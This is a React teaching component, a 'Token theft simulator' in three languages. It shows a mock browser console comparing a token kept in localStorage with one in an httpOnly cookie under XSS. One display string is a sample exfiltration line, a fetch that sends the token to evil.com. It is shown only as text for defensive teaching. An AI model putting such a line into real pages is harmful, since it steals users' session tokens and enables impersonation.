import { useEffect, useRef, useState } from 'react';
import { LabFrame, SecStyles, Segmented, Verdict, tr, useReducedMotion, type L, type Lang } from './ui';

/** Simulated DevTools console: what an injected script can read per storage choice. */

const T: Record<string, L> = {
  title: { zh: '惡意腳本偷 Token 模擬', en: 'Token theft simulator', de: 'Token-Diebstahl-Simulator' },
  hint: {
    zh: '先選 token 存在哪裡，再按下「執行注入的腳本」，看看同一段腳本能拿到什麼。',
    en: 'Pick where the token is stored, then run the injected script and see what it gets.',
    de: 'Wähle, wo der Token liegt, und führe das eingeschleuste Skript aus.',
  },
  where: { zh: 'Token 存放位置', en: 'Token storage', de: 'Token-Speicherort' },
  ls: { zh: 'localStorage', en: 'localStorage', de: 'localStorage' },
  cookie: { zh: 'httpOnly Cookie', en: 'httpOnly cookie', de: 'httpOnly-Cookie' },
  run: { zh: '▶ 執行注入的腳本', en: '▶ Run injected script', de: '▶ Skript ausführen' },
  running: { zh: '執行中…', en: 'Running…', de: 'Läuft…' },
  lost: {
    zh: '✗ Token 外洩：攻擊者可以把它放進 Authorization 標頭，在任何地方冒充你。',
    en: '✗ Token leaked: the attacker can put it in an Authorization header and impersonate you anywhere.',
    de: '✗ Token geleakt: Der Angreifer kann ihn in einen Authorization-Header setzen und sich überall als du ausgeben.',
  },
  kept: {
    zh: '✓ 偷不到 token。但注意：腳本還在執行，仍能「當下」以你的身分發請求，所以 XSS 防護和 CSP 還是必要的。',
    en: "✓ The token can't be stolen. But the script is still running and can send requests as you right now, so XSS protection and CSP are still needed.",
    de: '✓ Der Token ist nicht stehlbar. Das Skript läuft aber weiter und kann jetzt in deinem Namen Requests senden, also bleiben XSS-Schutz und CSP nötig.',
  },
  c1: { zh: '// token 不在 JavaScript 能讀到的範圍', en: '// the token is out of reach for JavaScript', de: '// der Token ist für JavaScript unerreichbar' },
};

type Line = { kind: 'in' | 'out' | 'bad' | 'muted'; text: string };

const SCRIPTS: Record<'ls' | 'cookie', (lang: Lang) => Line[]> = {
  ls: () => [
    { kind: 'in', text: "localStorage.getItem('token')" },
    { kind: 'bad', text: "'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiI0MiJ9.k3y…'" },
    { kind: 'in', text: "fetch('https://evil.com/steal?t=' + token)" },
    { kind: 'bad', text: 'Promise {<fulfilled>: Response}  → 200 evil.com' },
  ],
  cookie: (lang) => [
    { kind: 'in', text: 'document.cookie' },
    { kind: 'out', text: "''" },
    { kind: 'in', text: "localStorage.getItem('token')" },
    { kind: 'out', text: 'null' },
    { kind: 'muted', text: tr(T.c1, lang) },
  ],
};

export default function TokenLab({ lang = 'en' }: { lang?: Lang }) {
  const [where, setWhere] = useState<'ls' | 'cookie'>('ls');
  const [shown, setShown] = useState(0);
  const [ran, setRan] = useState(false);
  const timers = useRef<number[]>([]);
  const reduced = useReducedMotion();
  const lines = SCRIPTS[where](lang);
  const finished = ran && shown >= lines.length;

  const clear = () => {
    timers.current.forEach((id) => window.clearTimeout(id));
    timers.current = [];
  };
  useEffect(() => clear, []);

  const run = () => {
    clear();
    setRan(true);
    setShown(reduced ? lines.length : 0);
    if (reduced) return;
    lines.forEach((_, i) => {
      timers.current.push(window.setTimeout(() => setShown(i + 1), 450 * (i + 1)));
    });
  };

  const change = (w: 'ls' | 'cookie') => {
    clear();
    setWhere(w);
    setRan(false);
    setShown(0);
  };

  return (
    <LabFrame lang={lang} title={tr(T.title, lang)} hint={tr(T.hint, lang)} testId="lab-token">
      <SecStyles />
      <div className="flex flex-wrap items-center justify-between gap-3">
        <Segmented
          label={tr(T.where, lang)}
          value={where}
          onChange={change}
          options={[
            { value: 'ls', label: tr(T.ls, lang) },
            { value: 'cookie', label: tr(T.cookie, lang) },
          ]}
        />
        <button
          type="button"
          onClick={run}
          disabled={ran && !finished}
          data-testid="token-run"
          className="border-2 border-[#2E382E] bg-[#FF6A2B] px-3 py-1.5 text-xs font-extrabold text-[#2A1208] disabled:opacity-50"
        >
          {ran && !finished ? tr(T.running, lang) : tr(T.run, lang)}
        </button>
      </div>

      <div className="mt-3 border-2 border-[#5B695B] bg-[#1F271F] font-mono text-[12.5px]">
        <div className="flex gap-1.5 border-b border-[#3A463A] px-3 py-1.5 text-[10px] font-bold">
          {['Elements', 'Console', 'Application'].map((tab) => (
            <span key={tab} className={tab === 'Console' ? 'bg-[#DDFF00] px-2 py-0.5 text-[#2E382E]' : 'px-2 py-0.5 text-[#C9D1C4]'}>
              {tab}
            </span>
          ))}
        </div>
        <div className="min-h-[124px] space-y-1 px-3 py-2" data-testid="token-console">
          {lines.slice(0, ran ? shown : 0).map((ln, i) => (
            <div
              key={`${where}-${i}`}
              className={
                'sec-pop break-all ' +
                (ln.kind === 'in'
                  ? 'text-[#EEF1E6]'
                  : ln.kind === 'bad'
                    ? 'text-[#FF9A6E]'
                    : ln.kind === 'muted'
                      ? 'text-[#7C8A7C]'
                      : 'text-[#B7D400]')
              }
            >
              {ln.kind === 'in' ? '> ' : ln.kind === 'muted' ? '' : '← '}
              {ln.text}
            </div>
          ))}
          {!ran && <div className="text-[#7C8A7C]">&gt; _</div>}
        </div>
      </div>

      {finished && (
        <div className="mt-3" data-testid="token-verdict">
          {where === 'ls' ? <Verdict tone="bad">{tr(T.lost, lang)}</Verdict> : <Verdict tone="good">{tr(T.kept, lang)}</Verdict>}
        </div>
      )}
    </LabFrame>
  );
}
